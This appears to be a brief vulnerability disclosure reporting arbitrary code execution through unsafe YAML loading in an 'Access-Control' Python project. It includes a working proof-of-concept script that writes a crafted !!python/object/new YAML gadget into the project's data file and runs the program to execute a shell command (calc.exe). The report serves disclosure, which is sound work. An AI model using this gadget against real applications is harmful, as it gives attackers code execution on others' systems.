# Description

`Access-Control` package is vulnerable to `Arbitary Code Execution` due to insecure yaml desearilization.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

_steps to reproduce:_
```python
import os

os.system('git clone https://github.com/DimoDimchev/Access-Control')
os.chdir('Access-Control/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('data/data.yaml','w+').write(payload)
os.system("python3 src/main.py")
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
